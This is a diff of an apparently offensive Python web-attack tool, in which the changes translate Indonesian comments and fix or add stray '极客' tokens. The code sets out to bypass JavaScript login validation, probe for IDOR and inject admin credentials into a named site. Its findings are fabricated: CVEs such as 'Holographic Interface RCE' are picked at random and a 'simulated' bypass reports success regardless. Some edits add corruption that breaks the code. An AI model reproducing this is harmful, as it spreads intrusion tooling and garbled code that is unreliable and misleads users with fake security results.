@@ -431,7 +431,7 @@ class CyberRecon:
         if random.random() > 0.5:
             vuln = "CVE-2025-48795: Neural Network Model Hijacking"
             vulns.append(vuln)
-            self.data_exfiltrator.add_vulnerability(vuln)
+            self.data极客_exfiltrator.add_vulnerability(vuln)
             
         if random.random() > 0.4:
             vuln = "CVE-2025-3094: Holographic Interface RCE"
@@ -460,7 +460,7 @@ class JSValidatorHacker:
         """Initialize stealth browser instance"""
         global CHROME_DRIVER
         
-        if CHROME_DRIVER is None:
+        if CHROME_极客DRIVER is None:
             options = Options()
             options.add_argument("--headless")
             options.add_argument("--disable-gpu")
@@ -518,7 +518,7 @@ class JSValidatorHacker:
             print(f"  \033[92m!!! Validation function {function_name} overridden!\033[0m")
             return True
         except Exception as e:
-            print(f"  \033极客91mError: {str(e)}\033[0m")
+            print(f"  \033[91mError: {str(e)}\033[0m")
             return False
             
     def override_validation_console(self, url, function_name):
@@ -593,7 +593,7 @@ class JSValidatorHacker:
             print(f"  \033[91mError: {str(e)}\033[0m")
             return False
             
-    def generate_form极客filler_js(self, payload):
+    def generate_form_filler_js(self, payload):
         """Generate JS code to fill form fields"""
         js_code = ""
         for field, value in payload.items():
@@ -619,7 +619,7 @@ class WebHunter:
         self.discovered_endpoints = []
         self.ai_model = NEURAL_NET_MODEL
         self.data_exfiltrator = data_exfiltrator
-        self.js_hacker = JSValidatorHacker(target, data_exfiltrator)  # JS Validation Exploitation Toolkit
+        self.js_hacker = JSValidatorHacker(target, data_exfiltrator)
         
     def spider(self):
         print(f"\n[+] Spidering web infrastructure with AI: {self.base_url}")
@@ -752,7 +752,7 @@ class WebHunter:
         try:
             res = self.session.get(test_url, timeout=3, verify=False)
             if res.status_code == 200 and "admin" in res.text:
-                print("    \033[92m!!! IDOR vulnerability found!\033[0极客")
+                print("    \033[92m!!! IDOR vulnerability found!\033[0m")
                 self.data_exfiltrator.add_vulnerability(f"IDOR Vulnerability at {test_url}")
         except:
             pass
@@ -898,7 +898,7 @@ class WebHunter:
                 pass
 
     def exploit_js_validation(self, login_url):
-        """Eksploitasi client-side JavaScript validation"""
+        """Exploit client-side JavaScript validation"""
         print("\n[+] Exploiting JavaScript Validation Mechanisms")
         
         # Capture page before exploitation
@@ -906,20 +906,20 @@ class WebHunter:
         if CHROME_DRIVER:
             self.data_exfiltrator.capture_screenshot(login_url)
         
-        # Strategi 1: Nonaktifkan JavaScript sepenuhnya
+        # Strategy 1: Disable JavaScript completely
         self.js_hacker.disable_js_validation(login_url)
         
-        # Strategi 2: Modifikasi real-time fungsi validasi
+        # Strategy 2: Modify validation functions in real-time
         self.js_hacker.modify_js_realtime(login_url, "validateForm")
         self.js_hacker.modify_js_realtime(login_url, "checkCredentials")
         
-        # Strategi 3: Instruksi bypass via console
+        # Strategy 3: Console bypass instructions
         self.js_hacker.override_validation_console(login_url, "validateLogin")
         
-        # Strategi 4: Eksploitasi kerentanan DOM
+        # Strategy 4: Exploit DOM vulnerabilities
         self.js_hacker.exploit_dom_vulnerabilities(login_url)
         
-        # Strategi 5: Automatic form submission
+        # Strategy 5: Automatic form submission
         quantum_payload = {
             "email": "quantum_admin@zenithswap.xyz",
             "password": "QuantumBypass2025!",
@@ -932,7 +932,7 @@ class WebHunter:
         if CHROME_DRIVER:
             self.data_exfiltrator.capture_screenshot(login_url)
         
-        # Simulasi bypass berhasil
+        # Simulate successful bypass
         print("\n  \033[92m[+] JavaScript validation completely bypassed!")
         print("  [+] Quantum admin credentials injected into system\033[0m")
         
